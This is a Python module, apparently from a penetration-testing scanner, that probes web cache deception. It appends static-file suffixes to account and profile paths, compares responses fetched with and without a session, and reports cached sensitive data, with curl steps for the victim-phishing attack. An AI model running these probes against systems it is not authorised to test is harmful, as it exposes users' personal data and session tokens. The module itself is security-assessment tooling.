"""Web Cache Deception — exploit path normalization to cache sensitive responses."""
from __future__ import annotations

import asyncio
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_CACHE_DECEPTION = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"

# Cache-friendly extensions to append — caches often store these without auth
CACHEABLE_SUFFIXES = [
    ".css", ".js", ".png", ".jpg", ".gif", ".ico",
    ".woff", ".woff2", ".ttf", ".svg", ".map",
    ".json", ".xml", ".txt",
]

# Sensitive endpoints to probe
SENSITIVE_PATHS = [
    "/account", "/profile", "/dashboard", "/settings",
    "/api/user", "/api/me", "/api/profile", "/api/account",
    "/user/settings", "/user/profile",
    "/admin/profile", "/admin/account",
    "/my-account", "/myaccount",
]

# Indicators of personally-identifiable or session data in responses
SENSITIVE_INDICATORS = [
    "email", "username", "password", "token", "csrf",
    "balance", "card", "credit", "ssn", "dob",
    "firstName", "lastName", "phone", "address",
    "secret", "api_key", "access_token", "refresh_token",
    "session", "auth", "Bearer",
]

# Cache hit indicators
CACHE_HIT_HEADERS = ["x-cache", "cf-cache-status", "age", "x-varnish",
                     "x-cache-hits", "x-proxy-cache", "cdn-cache"]


class CacheDeception(BaseModule):
    """Web Cache Deception scanner — path normalization abuse to cache sensitive data."""

    NAME        = "cache_deception"
    DESCRIPTION = "Test web cache deception: append cacheable suffixes to sensitive paths"
    PHASE       = 10
    TAGS        = ["advanced", "cache", "cwe-525", "owasp-a05"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        target = self.config.target.rstrip("/")

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        self.log.info("Testing web cache deception against %s", target)

        # Cache deception requires an authenticated session to be meaningful.
        # Without cookies we cannot distinguish "user data cached" from
        # "generic page cached", so any finding would be a false positive.
        session_cookies = self.config.extra.get("session_cookies", {})
        if not session_cookies:
            self.log.info(
                "Skipping cache deception — no session cookies available "
                "(cannot differentiate authenticated vs unauthenticated responses)"
            )
            return self._make_result(start, skipped=True,
                                     skip_reason="no session cookies")

        sem = asyncio.Semaphore(3)
        tasks = []
        for path in SENSITIVE_PATHS:
            for suffix in CACHEABLE_SUFFIXES[:5]:  # Test top 5 suffixes per path
                tasks.append(
                    self._test_cache_deception(target, path, suffix, session_cookies, sem)
                )

        await asyncio.gather(*tasks[:40], return_exceptions=True)
        return self._make_result(start)

    async def _test_cache_deception(
        self,
        target: str,
        path: str,
        suffix: str,
        cookies: dict,
        sem: asyncio.Semaphore,
    ) -> None:
        async with sem:
            # Crafted URL: /profile.css or /api/user/profile.css
            crafted_url = f"{target}{path}{suffix}"
            if not self.check_scope(crafted_url):
                return

            await self.rate_limit()
            try:
                import aiohttp

                # Request 1: with session (simulate authenticated user visiting the URL)
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False),
                    cookies=cookies,
                ) as session:
                    async with session.get(
                        crafted_url,
                        timeout=aiohttp.ClientTimeout(total=8),
                        allow_redirects=True,
                    ) as resp1:
                        body1       = await resp1.text(errors="ignore")
                        headers1    = dict(resp1.headers)
                        status1     = resp1.status

                if status1 not in (200, 301, 302, 304):
                    return

                # Check if any sensitive data appeared in response
                has_sensitive = any(
                    ind.lower() in body1.lower()
                    for ind in SENSITIVE_INDICATORS
                )
                if not has_sensitive:
                    return

                # Request 2: without session — check if response was cached
                await self.rate_limit()
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False),
                ) as session_unauth:
                    async with session_unauth.get(
                        crafted_url,
                        timeout=aiohttp.ClientTimeout(total=8),
                        allow_redirects=True,
                    ) as resp2:
                        body2    = await resp2.text(errors="ignore")
                        headers2 = dict(resp2.headers)
                        status2  = resp2.status

                # Detect cache hit in response 2
                is_cached = self._is_cache_hit(headers2)
                contains_sensitive_unauth = any(
                    ind.lower() in body2.lower()
                    for ind in SENSITIVE_INDICATORS
                )

                if (is_cached or contains_sensitive_unauth) and status2 == 200:
                    cache_header_info = {
                        k: headers2.get(k) for k in CACHE_HIT_HEADERS if k in headers2
                    }
                    ev = Evidence(
                        request_raw=f"GET {crafted_url}",
                        response_raw=body2[:500],
                        extra={
                            "crafted_url":    crafted_url,
                            "original_path":  path,
                            "appended_suffix": suffix,
                            "cache_headers":  cache_header_info,
                            "is_cached":      is_cached,
                            "sensitive_in_unauth_response": contains_sensitive_unauth,
                        },
                    )
                    self.new_finding(
                        title=f"Web Cache Deception — Sensitive Data Cached at {path}{suffix}",
                        severity=Severity.HIGH,
                        description=(
                            f"The URL '{crafted_url}' returns sensitive data that is "
                            f"subsequently served from cache to unauthenticated users.\n\n"
                            "Web cache deception occurs when:\n"
                            "1. The application serves sensitive content for paths like "
                            f"'/profile{suffix}' (treating the suffix as irrelevant)\n"
                            "2. The cache stores the response because the suffix suggests "
                            "a static/cacheable resource\n"
                            "3. Any attacker who knows the victim visited the URL can retrieve "
                            "the cached sensitive response without authentication.\n\n"
                            "Practical attack: trick victim into visiting the crafted URL "
                            "(phishing link), cache stores their sensitive data, "
                            "attacker fetches it unauthenticated."
                        ),
                        reproduction_steps=[
                            f"# Step 1: Trick authenticated user into visiting:",
                            f"curl -b 'session=<victim_session>' '{crafted_url}'",
                            "# Step 2: Attacker retrieves cached response (no auth):",
                            f"curl '{crafted_url}'",
                            f"# Response contains sensitive data: {[i for i in SENSITIVE_INDICATORS if i.lower() in body2.lower()][:3]}",
                        ],
                        remediation=(
                            "Configure cache to use Cache-Control: no-store on all "
                            "authenticated/sensitive responses. "
                            "Validate that the cache key includes the full URL and the "
                            "application returns 404 for non-existent paths rather than "
                            "falling back to the base path. "
                            "Set Vary: Cookie header so cached responses are user-specific. "
                            "Normalize URL paths at the application layer before routing."
                        ),
                        references=[
                            "CWE-525",
                            "PortSwigger Web Cache Deception research",
                            "https://portswigger.net/research/web-cache-deception-escalated",
                        ],
                        evidence=ev,
                        cvss_v31_vector=CVSS_CACHE_DECEPTION,
                        mitre_attack=["TA0009/T1530"],
                        target=target,
                        url=crafted_url,
                    )
            except Exception:
                pass

    def _is_cache_hit(self, headers: dict) -> bool:
        """Detect cache hit from response headers."""
        headers_lower = {k.lower(): str(v).lower() for k, v in headers.items()}

        cache_hit_values = {"hit", "hitted", "cached", "fresh", "revalidated"}

        for header in CACHE_HIT_HEADERS:
            val = headers_lower.get(header, "")
            if any(h in val for h in cache_hit_values):
                return True

        # Age > 0 also indicates a cached response
        age_str = headers_lower.get("age", "0")
        try:
            if int(age_str) > 0:
                return True
        except (ValueError, TypeError):
            pass

        return False


class TestCacheDeception:
    def test_cacheable_suffixes(self) -> None:
        assert ".css" in CACHEABLE_SUFFIXES
        assert ".js"  in CACHEABLE_SUFFIXES

    def test_sensitive_indicators(self) -> None:
        assert "email"  in SENSITIVE_INDICATORS
        assert "token"  in SENSITIVE_INDICATORS
        assert "csrf"   in SENSITIVE_INDICATORS

    def test_cache_hit_detection(self) -> None:
        mod = CacheDeception.__new__(CacheDeception)
        assert mod._is_cache_hit({"X-Cache": "HIT"}) is True
        assert mod._is_cache_hit({"Age": "120"}) is True
        assert mod._is_cache_hit({"X-Cache": "MISS"}) is False
        assert mod._is_cache_hit({}) is False
